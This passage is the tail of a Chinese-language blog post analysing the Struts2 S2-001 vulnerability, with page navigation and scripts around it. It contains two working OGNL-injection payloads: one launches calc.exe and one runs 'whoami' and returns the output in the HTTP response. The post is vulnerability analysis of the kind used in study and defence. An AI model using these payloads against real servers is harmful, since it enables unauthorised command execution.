+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pop a calc: </span><br><span class="line">%&#123;(<span class="keyword">new</span> java.lang.<span class="constructor">ProcessBuilder(<span class="params">new</span> <span class="params">java</span>.<span class="params">lang</span>.String[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span>).start<span class="literal">()</span>&#125;</span><br><span class="line">Execute os command: </span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> java.lang.<span class="constructor">ProcessBuilder(<span class="params">new</span> <span class="params">java</span>.<span class="params">lang</span>.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)</span>).redirect<span class="constructor">ErrorStream(<span class="params">true</span>)</span>.start<span class="literal">()</span>,#b=#a.get<span class="constructor">InputStream()</span>,#c=<span class="keyword">new</span> java.io.<span class="constructor">InputStreamReader(#<span class="params">b</span>)</span>,#d=<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(#<span class="params">c</span>)</span>,#e=<span class="keyword">new</span> <span class="built_in">char</span><span class="literal">[<span class="number">50000</span>]</span>,#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.get<span class="constructor">Writer()</span>.println(<span class="keyword">new</span> java.lang.<span class="constructor">String(#<span class="params">e</span>)</span>),#f.get<span class="constructor">Writer()</span>.flush<span class="literal">()</span>,#f.get<span class="constructor">Writer()</span>.close<span class="literal">()</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409984.png"><br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409139.png"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2044#toc-1">【Struts2-命令-代码执行漏洞分析系列】S2-001</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/twosmi1e/p/14020361.html#">S2-001漏洞分析</a><br><a target="_blank" rel="noopener" href="https://su18.org/post/struts2-1/#s2-001">Struts2：你说你好累，已无法再爱上谁（一）</a></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>S0cke3t<br>
+        <strong>本文链接：</strong><a href="http://www.saferoad.cc/Analysis/Struts2-vuln-analysis-S2-001.html" title="http:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;Struts2-vuln-analysis-S2-001.html" target="_blank" rel="noopener">http:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;Struts2-vuln-analysis-S2-001.html</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Analysis/">Analysis</a>
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Java/" rel="tag">Java</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Struts2/" rel="tag">Struts2</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Why-do-this"><span class="toc-number">1.</span> <span class="toc-text">Why do this</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">4.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+ 
+
+<script async src="/js/app.js?v=1648475627163"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+</body>
+
+</html>
